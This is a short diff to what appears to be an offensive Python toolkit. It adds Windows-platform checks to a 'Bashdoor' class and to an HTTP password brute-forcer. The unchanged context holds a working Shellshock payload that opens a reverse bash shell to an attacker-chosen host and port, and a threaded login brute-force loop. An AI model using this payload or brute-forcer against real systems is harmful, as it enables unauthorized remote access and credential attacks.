@@ -12,6 +12,7 @@ from paramiko import SSHClient
 from paramiko import AutoAddPolicy
 
 # My modules
+from ..core import errors
 from ..core import tool as core
 from ..core import headers as head
 
@@ -79,6 +80,10 @@ class Bashdoor:
 		self.LHOST = LHOST
 		self.LPORT = LPORT
 		self.PAYLOAD = "() { :; }; echo; /bin/bash -i >& /dev/tcp/%s/%s 0>&1" %(self.LHOST, self.LPORT)
+
+		if platform.system() == "Windows":
+			raise errors.WindowsError("This class can't be runned on a windows host.")
+
 		self.run()
 
 	def listener(self):
@@ -227,8 +232,10 @@ class HTTPBrute:
 			finally:
 				q.task_done()
 
-			sys.stdout.write(self.c.INFO + "Passwords to test: %d\r" % q.qsize())
-			sys.stdout.flush()
+			if platform.system() != "Windows":
+				# There's some print fails here on windows.
+				sys.stdout.write(self.c.INFO + "Passwords to test: [%d]\r" % q.qsize())
+				sys.stdout.flush()
 
   	def run(self):
   		q = Queue.Queue()
